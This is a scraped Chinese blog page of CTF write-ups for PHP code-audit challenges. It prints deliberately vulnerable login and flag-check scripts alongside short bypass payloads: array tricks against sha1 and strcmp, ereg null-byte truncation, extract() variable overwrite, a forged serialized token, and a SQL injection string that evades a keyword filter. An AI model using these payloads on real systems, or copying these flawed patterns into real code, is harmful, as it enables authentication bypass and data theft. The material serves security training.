+12345678910111213&lt;?phpif (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123;    if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;])        echo &#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;;    else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;]))      die(&#x27;Flag: &#x27;.$flag);    else        echo &#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;;&#125;else    echo &#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;;?&gt;
+
+123===会比较类型，比如bool。sha1()函数和md5()函数存在着漏洞，sha1()函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使sha1()函数返回错误，也就是返回false，这样一来===运算符就可以发挥作用了，需要构造username和password既不相等，又同样是数组类型?name[]=a&amp;password[]=b
+
+12345678910&lt;?phpsession_start(); if (isset ($_GET[&#x27;password&#x27;])) &#123;    if ($_GET[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])        die (&#x27;Flag: &#x27;.$flag);    else        print &#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt;
+
+1抓包删掉cookie中的session即可
+
+12345678910111213141516171819202122232425262728293031323334&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123;    $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) &#123;        die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select pw from php where user=&#x27;$user&#x27;&quot;;$query = mysql_query($sql);if (!$query) &#123;    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;&#125;else &#123;    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);  &#125;&#125;?&gt;
+
+ 通过构造sql语句使row[pw]等于pass
+12345678910111213&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123;  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125;?&gt;
+
+正则漏洞，%00截断
+123456789101112131415161718192021222324252627282930&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123;    $conn = mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) &#123;        die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select user from php where (user=&#x27;$user&#x27;) ...
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;number&#x27;]))&#123;</span><br><span class="line">   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_GET, $_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&#x27;number&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $info=&quot;sorry, you cann&#x27;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">elseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;])))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">     $info = &quot;number must be equal to it&#x27;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line"></span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#x27;common.php&#x27;;</span><br><span class="line">    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">    //把一个或多个数组合并为一个数组</span><br><span class="line">    class db</span><br><span class="line">    &#123;</span><br><span class="line">        public $where;</span><br><span class="line">        function __wakeup()</span><br><span class="line">        &#123;</span><br><span class="line">            if(!empty($this-&gt;where))</span><br><span class="line">            &#123;</span><br><span class="line">                $this-&gt;select($this-&gt;where);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        function select($where)</span><br><span class="line">        &#123;</span><br><span class="line">            $sql = mysql_query(&#x27;select * from user where &#x27;.$where);</span><br><span class="line">            //函数执行一条 MySQL 查询。</span><br><span class="line">            return @mysql_fetch_array($sql);</span><br><span class="line">            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($requset[&#x27;token&#x27;]))</span><br><span class="line">    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span><br><span class="line">    &#123;</span><br><span class="line">        $login = unserialize(gzuncompress(base64_decode($requset[&#x27;token&#x27;])));</span><br><span class="line">        //gzuncompress:进行字符串压缩</span><br><span class="line">        //unserialize: 将已序列化的字符串还原回 PHP 的值</span><br><span class="line"></span><br><span class="line">        $db = new db();</span><br><span class="line">        $row = $db-&gt;select(&#x27;user=\&#x27;&#x27;.mysql_real_escape_string($login[&#x27;user&#x27;]).&#x27;\&#x27;&#x27;);</span><br><span class="line">        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">        if($login[&#x27;user&#x27;] === &#x27;ichunqiu&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else if($row[&#x27;pass&#x27;] !== $login[&#x27;pass&#x27;])&#123;</span><br><span class="line">            echo &#x27;unserialize injection!!&#x27;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        header(&#x27;Location: index.php?error=1&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = array(&#x27;user&#x27; =&gt; &#x27;ichunqiu&#x27;);</span><br><span class="line">$a = base64_encode(gzcompress(serialize($arr)));</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#x27;uname&#x27;]) || !isset($_POST[&#x27;pwd&#x27;])) &#123;</span><br><span class="line">    echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;input type=&quot;submit&quot; /&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;/form&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo &#x27;&lt;!--source: source.txt--&gt;&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line"></span><br><span class="line">//检测变量是否是数组</span><br><span class="line"></span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line"></span><br><span class="line">//返回由数组元素组合成的字符串</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   </span><br><span class="line"></span><br><span class="line">//匹配成功一次后就会停止匹配</span><br><span class="line"></span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line"></span><br><span class="line">//遍历数组</span><br><span class="line"></span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">    die(&#x27;Could not connect: &#x27; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line"></span><br><span class="line">//设置活动的 MySQL 数据库</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &#x27;&#123;$_POST[&#x27;uname&#x27;]&#125;&#x27;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"></span><br><span class="line">//执行一条 MySQL 查询</span><br><span class="line"></span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line"></span><br><span class="line">//返回结果集中行的数目</span><br><span class="line"></span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line"></span><br><span class="line">//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br><span class="line"></span><br><span class="line">    if($key[&#x27;pwd&#x27;] == $_POST[&#x27;pwd&#x27;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$flag=&#x27;xxx&#x27;; </span><br><span class="line">extract($_GET);</span><br><span class="line"> if(isset($shiyan))</span><br><span class="line"> &#123; </span><br><span class="line">    $content=trim(file_get_contents($flag));</span><br><span class="line">    if($shiyan==$content)</span><br><span class="line">    &#123; </span><br><span class="line">        echo&#x27;ctf&#123;xxx&#125;&#x27;; </span><br><span class="line">    &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123; </span><br><span class="line">    echo&#x27;Oh.no&#x27;;</span><br><span class="line">   &#125; </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">变量覆盖漏洞</span><br><span class="line">PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</span><br><span class="line"></span><br><span class="line">file_get_contents：远程获取获取文件，若没有则为空</span><br><span class="line"></span><br><span class="line">构造shiyan=&amp;flag=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset ($_GET[&#x27;password&#x27;])) </span><br><span class="line">&#123;</span><br><span class="line">  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE)</span><br><span class="line">  &#123;</span><br><span class="line">    echo &#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999)</span><br><span class="line">   &#123;</span><br><span class="line">     if (strpos ($_GET[&#x27;password&#x27;], &#x27;*-*&#x27;) !== FALSE) </span><br><span class="line">      &#123;</span><br><span class="line">      die(&#x27;Flag: &#x27; . $flag);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        echo(&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;); </span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     else </span><br><span class="line">     &#123;</span><br><span class="line">        echo &#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;; </span><br><span class="line">      &#125;</span><br><span class="line">   &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ereg漏洞</span><br><span class="line">payload：1e9%00*-*</span><br><span class="line">正则%00截断</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;a&#x27;])) &#123;  </span><br><span class="line">    if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0) </span><br><span class="line">    //比较两个字符串（区分大小写） </span><br><span class="line">        die(&#x27;Flag: &#x27;.$flag);  </span><br><span class="line">    else  </span><br><span class="line">        print &#x27;离成功更近一步了&#x27;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?a[]=1</span><br></pre></td></tr></table></figure>
+
+<p><a class="link" target="_blank" rel="noopener" href="http://blog.csdn.net/zhaohansk/article/details/43984569">漏洞原理<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在5.3的版本之后使用strcmp函数比较会返回0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;])) </span><br><span class="line">&#123;</span><br><span class="line">    if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;])</span><br><span class="line">        echo &#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;;</span><br><span class="line">    else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;]))</span><br><span class="line">      die(&#x27;Flag: &#x27;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">    echo &#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">===会比较类型，比如bool。</span><br><span class="line">sha1()函数和md5()函数存在着漏洞，sha1()函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使sha1()函数返回错误，也就是返回false，这样一来===运算符就可以发挥作用了，需要构造username和password既不相等，又同样是数组类型</span><br><span class="line">?name[]=a&amp;password[]=b</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">    if ($_GET[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])</span><br><span class="line">        die (&#x27;Flag: &#x27;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抓包删掉cookie中的session即可</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&#x27;$user&#x27;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line"></span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line"></span><br><span class="line">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 通过构造sql语句使row[pw]等于pass</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>正则漏洞，%00截断</p>
